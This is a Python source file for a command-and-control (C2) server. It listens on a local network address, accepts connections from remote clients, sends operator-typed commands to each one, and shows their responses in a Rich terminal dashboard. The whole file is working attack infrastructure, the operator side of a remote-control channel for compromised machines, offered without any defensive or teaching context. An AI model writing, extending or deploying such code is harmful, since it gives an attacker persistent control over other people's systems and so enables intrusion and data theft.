import socket
import threading
from rich.console import Console
from rich.table import Table
from rich.layout import Layout
from rich.panel import Panel
from rich.prompt import Prompt
from rich.live import Live
from rich.text import Text

console = Console()

# Server config
HOST = "192.168.1.117"
PORT = 2222
clients = []
client_data = {}

# Client handling
def handle_client(client_socket, client_address):
    with client_socket:
        console.log(f"[bold green]Client connected from {client_address}[/bold green]")
        client_socket.send(b"Connected to C2 server\n")
        client_id = f"{client_address[0]}:{client_address[1]}"
        client_data[client_id] = ""

        try:
            while True:
                command = Prompt.ask(f"[bold yellow]Enter command for {client_id}[/bold yellow]")
                if command.lower() == "exit":
                    console.log(f"[red]Closing connection to {client_id}[/red]")
                    break

                client_socket.send(command.encode() + b"\n")

                # Receive the response
                response = client_socket.recv(4096).decode("utf-8")
                client_data[client_id] = response

                console.log(f"[bold cyan]Response from {client_id}:[/bold cyan] {response}")
        except (ConnectionResetError, BrokenPipeError):
            console.log(f"[red]Client {client_id} disconnected abruptly[/red]")
        finally:
            client_socket.close()
            clients.remove((client_socket, client_address))
            del client_data[client_id]
            console.log(f"[bold red]Client {client_id} disconnected[/bold red]")

# Server thread for accepting clients
def accept_clients(server_socket):
    with server_socket:
        while True:
            client_socket, client_address = server_socket.accept()
            clients.append((client_socket, client_address))
            threading.Thread(target=handle_client, args=(client_socket, client_address), daemon=True).start()

# TUI with Rich
def display_dashboard():
    layout = Layout()

    # Create panels for client overview and command logs
    layout.split_column(
        Layout(name="client_overview"),
        Layout(name="command_logs", ratio=2)
    )

    with Live(layout, refresh_per_second=1):
        while True:
            # Update client overview panel
            table = Table(title="Connected Clients", show_header=True, header_style="bold magenta")
            table.add_column("Client ID", justify="left", style="cyan")
            table.add_column("Status", justify="right", style="green")
            for _, addr in clients:
                client_id = f"{addr[0]}:{addr[1]}"
                table.add_row(client_id, "Connected")

            layout["client_overview"].update(Panel(table, title="Client Overview"))

            # Update command logs panel
            logs = Text()
            for client_id, data in client_data.items():
                logs.append(f"[bold cyan]{client_id}:[/bold cyan] {data}\n")
            layout["command_logs"].update(Panel(logs, title="Command Logs"))

def main():
    # Setup the server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    console.log(f"[bold blue]C2 server listening on {HOST}:{PORT}[/bold blue]")

    # Start client handler thread
    threading.Thread(target=accept_clients, args=(server_socket,), daemon=True).start()

    # Start TUI dashboard
    display_dashboard()

if __name__ == "__main__":
    main()

